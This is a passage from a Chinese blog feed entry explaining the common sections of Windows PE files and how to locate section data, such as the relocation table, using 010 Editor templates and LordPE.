alt=""></p><p>常见的节数据:<br>.text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code<br>.data：初始化的数据块，是初始化的数据块，包含那些编译时被初始化的变量、字符串<br>.idata：输入表，包含其他外来dll的函数和数据信息，也就是输入表，也有人称之为导入表。<br>.rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。<br>.reloc：重定位表，用于保存基址的重定位表。即当装在程序不能按照连接器所指定的地址装载文件时，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装在则忽略此段中的数据。<br>.edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态连接库文件中。<br>.radata：存放调试目录、说明字符串，该数据块并不常见主要是用于存放一些调试信息。</p><h2 id="更方便的手动查找"><a href="#更方便的手动查找" class="headerlink" title="更方便的手动查找"></a>更方便的手动查找</h2><p>利用010 Editor的模板<br>参考链接： <a href="https://bbs.pediy.com/thread-221766.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-221766.htm</a><br>官方模板链接：<a href="http://www.sweetscape.com/010editor/repository/templates/" target="_blank" rel="noopener">http://www.sweetscape.com/010editor/repository/templates/</a></p><p>下载EXE.bt，使用010 Editor加载运行模板<br><img src="https://s1.ax1x.com/2020/07/05/UShiNT.png" alt=""></p><p>点击Open Template，打开对应的模板，按F5运行<br><img src="https://s1.ax1x.com/2020/07/05/UShME6.png" alt=""></p><p>运行后会多处一个窗口，里面就是解析好的数据。（然后点开对应的结构，跟着表看就行）<br><img src="https://s1.ax1x.com/2020/07/05/USh3CD.png" alt=""></p><p>定位对应的段是使用地址来定位的，查看对应的VirtualAddress地址通过计算即可得到对应的节段地址<br>这里查看重定位表示例:<br><img src="https://s1.ax1x.com/2020/07/05/UShNDI.png" alt=""></p><p>对应VirtualAddress（虚拟地址）：28648h、Size：900<br>使用LordPE进行计算，得到地址<br><img src="https://s1.ax1x.com/2020/07/05/USh058.png" alt=""></p><p>010 Editor按Ctrl+G输入24248即可到达对应的地址<br><img src="https://s1.ax1x.com/2020/07/05/USh5PU.md.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PE介绍&quot;&gt;&lt;a href=&quot;#PE介绍&quot; class=&quot;headerlink&quot; title=&quot;PE介绍&quot;&gt;&lt;/a&gt;PE介绍&lt;/h2&gt;&lt;p&gt;PE（Portable Execute）文件是Windows下可移植可执行文件的总称，常见的有DLL，EXE，OCX，SYS</summary>
      
    
    
    
    
    <category term="windows" scheme="http://422926799.github.io/tags/windows/"/>
    
  </entry>
  
</feed>
